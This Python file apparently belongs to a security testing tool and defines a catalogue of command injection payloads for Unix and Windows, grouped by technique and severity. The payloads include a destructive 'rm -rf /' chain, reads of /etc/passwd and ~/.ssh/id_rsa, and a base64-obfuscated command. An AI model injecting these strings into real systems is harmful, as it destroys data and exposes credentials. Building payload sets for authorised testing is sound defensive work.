"""Command injection payload categories."""

import base64
from typing import List, Dict, Any


class CommandInjectionPayloads:
    """Collection of command injection attack payloads."""
    
    @staticmethod
    def get_basic_payloads() -> List[Dict[str, Any]]:
        """Get basic command injection payloads."""
        return [
            {
                "payload": "; whoami",
                "description": "Basic command chaining",
                "severity": "high",
                "technique": "command_chaining"
            },
            {
                "payload": "| cat /etc/passwd",
                "description": "Pipe-based injection",
                "severity": "critical",
                "technique": "pipe_injection"
            },
            {
                "payload": "&& rm -rf /",
                "description": "Destructive command injection",
                "severity": "critical",
                "technique": "destructive_command"
            },
        ]
    
    @staticmethod
    def get_obfuscated_payloads() -> List[Dict[str, Any]]:
        """Get obfuscated command injection payloads."""
        return [
            {
                "payload": "`echo $(whoami)`",
                "description": "Command substitution",
                "severity": "high",
                "technique": "command_substitution"
            },
            {
                "payload": "$(base64 -d <<< d2hvYW1p)",  # whoami in base64
                "description": "Base64 encoded command",
                "severity": "medium",
                "technique": "encoding_obfuscation"
            },
        ]
    
    @staticmethod
    def get_platform_specific_payloads() -> List[Dict[str, Any]]:
        """Get platform-specific command injection payloads."""
        return [
            # Windows
            {
                "payload": "& dir",
                "description": "Windows directory listing",
                "severity": "medium",
                "technique": "windows_specific",
                "platform": "windows"
            },
            {
                "payload": "| type C:\\windows\\system32\\drivers\\etc\\hosts",
                "description": "Windows file access",
                "severity": "high",
                "technique": "windows_file_access",
                "platform": "windows"
            },
            # Unix/Linux
            {
                "payload": "; ls -la",
                "description": "Unix directory listing",
                "severity": "medium", 
                "technique": "unix_specific",
                "platform": "unix"
            },
            {
                "payload": "| cat ~/.ssh/id_rsa",
                "description": "SSH key extraction",
                "severity": "critical",
                "technique": "key_extraction",
                "platform": "unix"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all command injection payloads."""
        payloads = []
        payloads.extend(CommandInjectionPayloads.get_basic_payloads())
        payloads.extend(CommandInjectionPayloads.get_obfuscated_payloads())
        payloads.extend(CommandInjectionPayloads.get_platform_specific_payloads())
        return payloads